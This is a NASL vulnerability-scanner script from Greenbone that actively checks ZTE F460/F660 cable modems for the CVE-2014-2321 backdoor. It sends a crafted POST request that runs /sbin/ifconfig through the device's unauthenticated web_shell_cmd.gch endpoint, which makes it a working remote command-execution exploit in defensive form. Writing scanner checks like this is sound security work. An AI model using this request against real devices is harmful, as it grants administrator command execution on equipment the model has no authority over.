# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103924");
  script_version("2025-09-11T05:38:37+0000");
  script_tag(name:"last_modification", value:"2025-09-11 05:38:37 +0000 (Thu, 11 Sep 2025)");
  script_tag(name:"creation_date", value:"2014-03-20 09:52:23 +0100 (Thu, 20 Mar 2014)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

  script_cve_id("CVE-2014-2321");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ZTE F460/F660 Backdoor Unauthorized Access Vulnerability (Mar 2014) - Active Check");

  # nb: Access to the web shell or calling ifconfig might be already seen as an attack...
  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("Mini_web_server/banner");

  script_tag(name:"summary", value:"ZTE F460/F660 cable modem devices are prone to an unauthorized
  access vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"web_shell_cmd.gch on ZTE F460 and F660 cable modems allows
  remote attackers to obtain administrative access via sendcmd requests.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to execute arbitrary commands
  with administrator level access on the affected device. This may aid in further attacks.");

  script_tag(name:"affected", value:"ZTE F460/F660 cabel modem devices are known to be affected.
  Other models or vendors might be affected as well.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_xref(name:"URL", value:"https://web.archive.org/web/20210120123923/http://www.securityfocus.com/bid/65962");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port( default:80 );

banner = http_get_remote_headers( port:port );

if( ! banner || banner !~ "Server\\s*:\\s*Mini web server" )
  exit( 0 );

if( http_vuln_check( port:port, url:"/web_shell_cmd.gch", pattern:"please input shell command" ) ) {

  useragent = http_get_user_agent();
  host = http_host_name( port:port );

  req = 'POST /web_shell_cmd.gch HTTP/1.1\r\n' +
        'Host: ' + host + '\r\n' +
        'User-Agent: ' + useragent + '\r\n' +
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n' +
        'Accept-Encoding: identify\r\n' +
        'Referer: http://' + host + '/web_shell_cmd.gch\r\n' +
        'Connection: Close\r\n' +
        'Content-Type: application/x-www-form-urlencoded\r\n' +
        'Content-Length: 98\r\n' +
        '\r\n' +
        'IF_ACTION=apply&IF_ERRORSTR=SUCC&IF_ERRORPARAM=SUCC&IF_ERRORTYPE=-1&Cmd=%2Fsbin%2Fifconfig&CmdAck=';
  res = http_send_recv( port:port, data:req );

  if( "Link encap" >< res && "HWaddr" >< res && "BROADCAST" >< res ) {
    report = "It was possible to execution the 'ifconfig' command." +
             '\n\nResult:\n\n' + chomp( res );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
